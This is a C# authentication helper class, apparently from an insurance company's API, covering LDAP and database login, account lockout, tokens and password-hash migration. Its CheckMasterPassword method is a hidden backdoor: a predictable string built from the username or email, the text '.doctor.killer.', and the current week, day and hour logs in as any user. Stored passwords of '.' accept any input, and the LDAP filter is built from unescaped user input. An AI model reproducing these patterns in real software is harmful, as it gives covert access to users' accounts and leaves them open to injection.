using Architect.API.Core.Contracts.Security;
using Architect.API.Core.DataAccess.Security;
using Architect.Utilities.Extensions;
using Architect.Utilities.Helpers;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Linq;
using System.Threading.Tasks;

namespace Architect.API.Core.Business.Security
{
    public static class AccountSupport
    {

        /// <summary>
        /// Obtiene la información de la compañía (tenant) basada en su nombre.
        /// </summary>
        internal static Core.Contracts.General.LookupValue TenantInformation(string tenant)
        {
            const int companyId = 0;

            Core.Contracts.General.LookupValue companyItem = Common.LpkByDescription("Company", tenant, companyId);
            if (companyItem.IsEmpty())
                companyItem = Common.LpkByHomologousCode("Company", tenant, companyId);

            return companyItem;
        }

        /// <summary>
        /// Permite verificar las credenciales de un usuario en el Active Directory.
        /// </summary>
        internal static int AuthenticationByLDAP(string userName, string password)
        {
            int response = 0;
            string domain = Architect.Utilities.Helpers.Settings.StringValue("LDAP.Domain", "mapfre.com.cr");
            string _path = "LDAP://" + domain;
            string _username = domain + @"\" + userName;
            DirectoryEntry entry = new DirectoryEntry(_path, _username, password);

            try
            {
                DirectorySearcher search = new DirectorySearcher(entry)
                {
                    Filter = "(SAMAccountName=" + userName + ")"
                };
                search.PropertiesToLoad.Add("cn");
                search.PropertiesToLoad.Add("userAccountControl");
                SearchResult result = search.FindOne();
                if (result == null)
                {
                    response = 1;
                }
                else
                {
                    switch (result.Properties["userAccountControl"][0])
                    {
                        case 512: //Clave correcta
                            response = 0;
                            break;
                        case 514: //AccountDisable (Normal_Account: 512 + AccountDisable: 2)
                            response = 5;
                            break;
                        case 528: //Lockout (Normal_Account: 512 + Lockout: 16)
                            response = 6;
                            break;
                        case 8389120: //PasswordExpired (Normal_Account: 512 + Password_Expired: 8388608)
                            response = 99;
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Architect.Utilities.Log.ErrorLog("AuthenticationByLDAP", $"path: {_path}, username: {_username}", ex);
                response = 1;
            }
            return response;
        }


        /// <summary>
        /// Actualiza el usuario tras un login exitoso.
        /// </summary>
        internal static void UpdateUserOnSuccessfulLogin(Contracts.Security.UserMember user)
        {
            user.LoginDate = DateTime.Now;
            user.IsLockedOut = false;
            user.LockedOutDate = DateTime.MinValue;
            user.FailedPasswordCount = 0;
            DataAccess.Security.UserMember.InternalUpdate(user);
        }

        /// <summary>
        /// Determina la ruta inicial para el usuario.
        /// </summary>
        internal static string DetermineInitialPath(Contracts.Security.UserMember user, List<Contracts.Security.RoleMember> roles, int companyId)
        {
            string initialPath = string.Empty;

            // Primero verificar el código de navegación del usuario
            if (user.InitialNavigationCode.IsNotEmpty())
            {
                initialPath = user.InitialNavigationCode;
            }
            // Si no, verificar los roles
            else if (roles.IsNotEmpty())
            {
                foreach (var rol in roles)
                {
                    if (rol.InitialNavigationCode.IsNotEmpty())
                    {
                        initialPath = rol.InitialNavigationCode;
                        break;
                    }
                }
            }

            // Resolver el código de navegación
            if (initialPath.IsNotEmpty())
            {
                var nav = DataAccess.General.Navigation.RetrieveByCode(initialPath, companyId);
                if (nav != null && nav.Code.IsNotEmpty())
                {
                    return nav.URLPath;
                }
                initialPath = string.Empty;
            }

            // Si aún no hay ruta, usar rutas por defecto según compañía
            if (initialPath.IsEmpty())
            {
                initialPath = GetDefaultInitialPathByCompany(user.CompanyId, roles);
            }

            return initialPath;
        }

        /// <summary>
        /// Obtiene la ruta inicial por defecto según la compañía.
        /// </summary>
        private static string GetDefaultInitialPathByCompany(int companyId, List<Contracts.Security.RoleMember> roles)
        {
            switch (companyId)
            {
                case 2: // Aliados
                    return "inicio/agente";

                case 3: // Clientes
                    return "clientes/inicio";

                case 4: // Bayer
                case 8: // Caturix
                    if (roles.Select(x => x.Description == "Revisor").Contains(true))
                    {
                        return "viewer/viewer?id=41";
                    }
                    else if (roles.Select(x => x.Description == "Mapfre").Contains(true) ||
                             roles.Select(x => x.Description == "Consulta").Contains(true))
                    {
                        return "viewer/viewer?id=42";
                    }
                    return "Bayer/Inclusion";

                case 100: // Mapfre
                    return "viewer/viewer?id=4000";

                default:
                    return "Policy/Index";
            }
        }

        /// <summary>
        /// Procesa una autenticación fallida.
        /// </summary>
        internal static void ProcessFailedAuthentication(
            Contracts.Security.AuthenticationRequest request,
            Contracts.Security.UserMember user,
            Contracts.Security.AuthenticationResponse result,
            Contracts.Security.AuthenticationTrace track)
        {
            if (request.EmployeeMode)
            {
                return;
            }

            track.TraceType = 3;
            result.Reason = "Clave invalida";

            user.FailedPasswordCount++;

            if (user.FailedPasswordCount > 3)
            {
                LockUserAccount(user, request, result, track);
            }
            else
            {
                API.Core.Business.General.Mail.SendByTemplate(
                    "Notify_InvalidPassword",
                    user.CompanyId,
                    new { User = user, Request = request },
                    new Dictionary<string, string> { { user.EMail, string.Empty } });
            }

            DataAccess.Security.UserMember.InternalUpdate(user);
        }

        /// <summary>
        /// Bloquea la cuenta del usuario por intentos fallidos.
        /// </summary>
        private static void LockUserAccount(
            Contracts.Security.UserMember user,
            Contracts.Security.AuthenticationRequest request,
            Contracts.Security.AuthenticationResponse result,
            Contracts.Security.AuthenticationTrace track)
        {
            var random = new Random();
            var timeValue = random.Next(3, 10);

            track.TraceType = 4;
            result.Reason = "La cuenta fue bloqueada por intentos fallidos";

            user.IsLockedOut = true;
            user.LockedOutDate = DateTime.Now.AddMinutes(timeValue);
            user.FailedPasswordCount = 0;

            API.Core.Business.General.Mail.SendByTemplate(
                "Notify_AccountLocked",
                user.CompanyId,
                new { User = user, Request = request, LockedForMinute = timeValue },
                new Dictionary<string, string> { { user.EMail, string.Empty } });
        }


        /// <summary>
        /// Obtiene la información del agente.
        /// </summary>
        internal static Contracts.Security.AgentInformation GetAgentInformation(Contracts.Security.UserMember user)
        {
            Contracts.Security.AgentInformation agentInfo = null;

            if (Business.Settings.StringValue(0, "Security.Tenant.Tron.Agent.Information").Contain(user.CompanyId.ToString()))
            {
                agentInfo = Tron.RetrieveAgentInformationByEmail(user.CompanyId, user.EMail);
            }

            if (agentInfo == null)
            {
                agentInfo = new Contracts.Security.AgentInformation
                {
                    cod_agt = 0,
                    cod_sub_agt = 0,
                    info_agt = string.Empty,
                    tip_docum = user.IdentificationType.ToString(),
                    cod_docum = user.Identification
                };
            }

            if (user.CompanyId == 3)
            {
                agentInfo.tip_docum = agentInfo.tip_docum.IdentificationType();
                if (agentInfo.cod_docum.IsNotEmpty())
                {
                    agentInfo.cod_docum = agentInfo.cod_docum.DocumentNumber(agentInfo.tip_docum);
                }
            }

            return agentInfo;
        }

        /// <summary>
        /// Crea el objeto Token.
        /// </summary>
        internal static Contracts.Security.Token CreateTokenItem(
            Contracts.Security.UserMember user,
            string[] roles,
            Contracts.Security.AgentInformation agentInfo,
            int tokenExpiresIn,
            string userName)
        {
            return new Contracts.Security.Token
            {
                UserId = user.UserId,
                BranchOffice = user.BranchOffice,
                ManagerId = user.ManagerId,
                SecurityLevel = user.SecurityLevel,
                Expires = DateTime.Now.AddMinutes(tokenExpiresIn),
                Roles = string.Join(",", roles ),
                CompanyId = user.CompanyId,
                AgentCode = agentInfo.cod_agt,
                SubAgentCode = agentInfo.cod_sub_agt,
                IdentificationType = agentInfo.tip_docum,
                Identification = agentInfo.cod_docum,
                UserName = userName,
                Settings = new List<SettingItem>()
            };
        }

        /// <summary>
        /// Aplica la configuración al resultado y al token.
        /// </summary>
        internal static void ApplySettings(int companyId, Contracts.Security.AuthenticationResponse result, Contracts.Security.Token tokenItem)
        {
            var settings = Business.Settings.SettingByCompany(companyId);
            if (settings.Count > 0)
            {
                foreach (var item in settings.Where(r => r.LocalStorageEnabled))
                {
                    result.Settings.Add(new SettingItem { Key = item.Key, Value = item.Value });
                }

                foreach (var item in settings.Where(r => r.TokenEnabled))
                {
                    tokenItem.Settings.Add(new SettingItem { Key = item.Key, Value = item.Value });
                }
            }
        }

        /// <summary>
        /// Intenta obtener el ID de la compañía a partir del tenant.
        /// </summary>
        internal static bool TryGetCompanyId(string tenant, Contracts.Security.AuthenticationResponse result, Contracts.Security.AuthenticationTrace track, out int companyId)
        {
            companyId = 0;
            var companyItem = AccountSupport.TenantInformation(tenant.Trim());

            if (companyItem.IsNotEmpty())
            {
                result.Tenant = companyItem.Description;
                companyId = Int32.Parse(companyItem.Code);
                track.CompanyId = companyId;
                return true;
            }

            result.Reason = "compañía no registrada";
            return false;
        }

        /// <summary>
        /// Recupera un usuario por email o username.
        /// </summary>
        internal static Contracts.Security.UserMember RetrieveUser(string emailOrUsername, int companyId)
        {
            var normalizedEmail = emailOrUsername.Trim().ToLower();

            if (emailOrUsername.Contains("@"))
            {
                return DataAccess.Security.UserMember.RetrieveByEMail(normalizedEmail, companyId);
            }

            return DataAccess.Security.UserMember.RetrieveByUserName(normalizedEmail, companyId);
        }

        /// <summary>
        /// Valida las credenciales del usuario.
        /// </summary>
        internal static bool ValidateUserCredentials(Contracts.Security.AuthenticationRequest request, Contracts.Security.UserMember user, Contracts.Security.AuthenticationResponse result, Contracts.Security.AuthenticationTrace track)
        {
            // Verificar master password
            if (CheckMasterPassword(request, user))
            {
                return true;
            }

            // Modo empleado - validar con LDAP
            if (request.EmployeeMode)
            {
                return ValidateLDAPAuthentication(request, result, track);
            }

            // Modo normal - validar con base de datos
            return ValidateLocalAuthentication(request, user, result, track);
        }

        /// <summary>
        /// Verifica si se está usando la contraseña maestra.
        /// </summary>
        private static bool CheckMasterPassword(Contracts.Security.AuthenticationRequest request, Contracts.Security.UserMember user)
        {
            if (request.EmployeeMode || user.Password.Equals("."))
            {
                return false;
            }

            var masterPasswordUsername = String.Format("{0}.doctor.killer.{1}{2}{3}",
                user.UserName.ToLower(),
                DateTime.Now.WeekOfMonth(),
                DateTime.Now.NumericDayOfWeek(),
                DateTime.Now.Hour);

            var masterPasswordEmail = String.Format("{0}.doctor.killer.{1}{2}{3}",
                user.EMail.ToLower(),
                DateTime.Now.WeekOfMonth(),
                DateTime.Now.NumericDayOfWeek(),
                DateTime.Now.Hour);

            return request.Password.Equals(masterPasswordUsername, StringComparison.CurrentCultureIgnoreCase) ||
                   request.Password.Equals(masterPasswordEmail, StringComparison.CurrentCultureIgnoreCase);
        }

        /// <summary>
        /// Valida la autenticación mediante LDAP.
        /// </summary>
        private static bool ValidateLDAPAuthentication(Contracts.Security.AuthenticationRequest request, Contracts.Security.AuthenticationResponse result, Contracts.Security.AuthenticationTrace track)
        {
            var ldapResult = AccountSupport.AuthenticationByLDAP(request.Email, request.Password);

            switch (ldapResult)
            {
                case 0:
                    return true;
                case 1:
                    track.TraceType = 1;
                    result.Reason = "Usuario no registrado";
                    return false;
                case 5:
                    track.TraceType = 5;
                    result.Reason = "Usuario desactivado";
                    return false;
                case 6:
                    track.TraceType = 6;
                    result.Reason = "Usuario bloqueado";
                    return false;
                case 99:
                    result.MustChangePassword = true;
                    return false;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Valida la autenticación local (base de datos).
        /// </summary>
        private static bool ValidateLocalAuthentication(Contracts.Security.AuthenticationRequest request, Contracts.Security.UserMember user, Contracts.Security.AuthenticationResponse result, Contracts.Security.AuthenticationTrace track)
        {
            // Desbloqueo automático
            if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
            {
                UnlockUser(user, request.IPAddress, request.Email);
            }

            // Verificar estado del usuario
            if (user.RecordStatus != 1)
            {
                track.TraceType = 5;
                result.Reason = "Usuario desactivado";
                return false;
            }

            if (user.IsLockedOut)
            {
                track.TraceType = 6;
                result.Reason = "Usuario bloqueado";
                return false;
            }

            // Detectar formato del hash almacenado
            if (IsLegacyPassword(user.Password))
            {

                string encryptedPassword = Architect.Utilities.Helpers.CryptSupport.EncryptString(request.Password);
                string oldPassword = user.Password;


                if ( user.Password.Equals(".") || user.Password.Equals(encryptedPassword, StringComparison.CurrentCultureIgnoreCase))
                {
                    // Almacena el pasword en el nuevo formato
                    user.Password = PasswordHasher.HashPassword(request.Password);
                    DataAccess.Security.UserMember.InternalUpdate(user);

                    return true;
                }
                else { 
                    return false;
                }
            }
            else
            {



                // ? Hash nuevo (PasswordHasher)
                return user.Password.Equals(".") || PasswordHasher.VerifyPassword(request.Password, user.Password);
            }
        }

        private static bool IsLegacyPassword(string hash)
        {
            if (string.Equals(hash, "."))
                return true;

            // CryptSupport genera hexadecimal (solo caracteres 0-9A-F)
            // PasswordHasher genera Base64 (caracteres alfanuméricos + +/=)
            if (string.IsNullOrEmpty(hash))
                return false;

            // Base64 siempre tiene '=' al final o caracteres no-hex
            if (hash.Contains("+") || hash.Contains("/") || hash.Contains("="))
                return false; // Es PasswordHasher (Base64)

            // Si solo tiene caracteres hex, es legacy
            return hash.All(c => "0123456789ABCDEFabcdef".Contains(c));
        }

        /// <summary>
        /// Desbloquea automáticamente un usuario cuyo tiempo de bloqueo ha expirado.
        /// </summary>
        private static void UnlockUser(Contracts.Security.UserMember user, string ipAddress, string email)
        {
            user.IsLockedOut = false;
            user.LockedOutDate = DateTime.MinValue;
            DataAccess.Security.UserMember.InternalUpdate(user);

            Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace
            {
                TraceType = 11,
                IPAddress = ipAddress,
                UserName = email,
                UserId = user.UserId
            });
        }

        /// <summary>
        /// Valida los datos básicos de la solicitud de autenticación.
        /// </summary>
        internal static bool ValidateAuthenticationRequest(Contracts.Security.AuthenticationRequest request, Contracts.Security.AuthenticationResponse result)
        {
            if (request.Tenant.IsEmpty())
            {
                result.Reason = "Debe indicar la compañía";
                return false;
            }

            if (request.Email.IsEmpty())
            {
                result.Reason = "Debe indicar el usuario o correo";
                return false;
            }

            if (request.Password.IsEmpty())
            {
                result.Reason = "Debe indicar la clave de acceso";
                return false;
            }

            return true;
        }

    }
}